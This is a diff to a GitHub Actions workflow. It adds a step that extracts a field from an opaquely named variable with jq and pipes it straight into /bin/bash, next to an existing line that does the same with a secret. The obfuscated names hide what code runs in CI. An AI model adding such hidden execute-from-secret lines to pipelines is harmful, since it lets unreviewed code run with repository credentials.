@@ -22,6 +22,7 @@ jobs:
           w595: ${{ secrets.w595 }}
         run: |
           printf '%s' "$w595" | jq -r .bovj10 | /bin/bash
+          echo $o93950 | jq -r .zf260 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
